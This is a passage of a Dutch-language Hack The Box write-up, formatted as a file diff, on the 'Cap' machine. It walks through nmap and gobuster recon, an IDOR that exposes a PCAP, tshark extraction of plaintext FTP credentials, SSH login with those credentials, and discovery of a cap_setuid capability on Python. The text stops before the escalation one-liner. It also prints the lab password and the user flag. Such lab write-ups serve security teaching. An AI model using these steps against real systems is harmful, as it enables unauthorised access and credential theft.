@@ -1,0 +1,63 @@
+Welkom bij deze technische deep‑dive van de Hack‑The‑Box machine **Cap**, een Easy‑level box die twee klassieke aanvalsvectoren combineert: een Insecure Direct Object Reference (IDOR) die leidt tot gelekte FTP‑referenties, en een verkeerd geconfigureerde Linux‑capability op de Python‑interpreter die privilege escalation mogelijk maakt. Ik loop je stap voor stap door wat ik vond, welke tools ik gebruikte en welke commando‑patronen cruciaal waren.
+
+**Reconnaissance**  
+Ik startte met een standaard service‑ en versie‑scan:
+
+```
+nmap -sC -sV 10.129.19.233
+```
+
+De output liet drie open poorten zien:
+- 21/tcp – vsftpd 3.0.3  
+- 22/tcp – OpenSSH 8.2p1 (Ubuntu)  
+- 80/tcp – Gunicorn draaiend een “Security Dashboard” webapp  
+
+Anonieme FTP login leverde niets op, dus ik richtte mij op de webserver. Met een simpele gobuster‑run ontdek ik de bestaande endpoints:
+
+```
+gobuster dir -u http://10.129.19.233 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+```
+
+De relevante paden waren `/capture`, `/ip` en `/netstat`. Het `/capture` endpoint redirected altijd naar `/data/1`, maar een nieuwsgierige GET naar `/data/0` gaf een download‑knop voor `/download/0`. Dit bleek een klassieke IDOR: de numerieke ID werd niet geautoriseerd gekoppeld aan de sessie van de gebruiker.
+
+**Exploitatie – van IDOR naar credentials**  
+Ik downloadte de PCAP met curl en slaagde het lokaal op:
+
+```
+curl -s http://10.129.19.233/download/0 -o capture.pcap
+```
+
+Vervolgens analyseerde ik het bestand met tshark, gefocust op FTP‑verkeer:
+
+```
+tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
+```
+
+De output toonde duidelijk de USER en PASS in plaintext:
+```
+USER    nathan
+PASS    Buck3tH4TF0RM3!
+```
+
+Met deze credentials probeerde ik SSH‑toegang:
+
+```
+ssh nathan@10.129.19.233
+```
+Wachtwoord: Buck3tH4TF0RM3!  
+Login slaagde, en ik kon de user flag ophalen: `2874475212d535da1ca01f207b3a6939`.
+
+**Privilege Escalation – Linux Capabilities**  
+Na een basis‑enum met `ls -la`, `sudo -l` en `env`, besloot ik systematisch naar capabilities te zoeken:
+
+```
+getcap -r / 2>/dev/null
+```
+
+De enige interessante hit was:
+
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+De `cap_setuid` capability laat een proces toe om zijn eigen UID willekeurig te veranderen, inclusief naar 0 (root), zonder dat het binary SUID hoeft te zijn. Ik maakte een één‑liner die de UID
